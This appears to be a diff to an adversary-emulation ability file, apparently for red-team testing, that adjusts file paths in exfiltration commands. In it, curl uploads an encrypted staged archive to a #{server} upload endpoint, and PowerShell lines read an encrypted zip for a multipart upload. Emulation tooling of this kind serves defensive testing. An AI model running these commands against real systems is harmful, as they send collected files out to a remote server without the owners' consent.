@@ -10,13 +10,13 @@
   executors:
     darwin:
       command: |
-        curl -F "data=@#{files}/staged.tgz.enc" #{server}/file/upload
+        curl -F "data=@staged.tgz.enc" #{server}/file/upload
     linux:
       command: |
-        curl -F "data=@#{files}/staged.tgz.enc" #{server}/file/upload
+        curl -F "data=@staged.tgz.enc" #{server}/file/upload
     windows:
       command: |
-        $fileBin = [System.IO.File]::ReadAllBytes("#{files}\staged.zip.enc");
+        $fileBin = [System.IO.File]::ReadAllBytes("staged.zip.enc");
         $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
         $fileEnc = $enc.GetString($fileBin);
         $boundary = [System.Guid]::NewGuid().ToString();
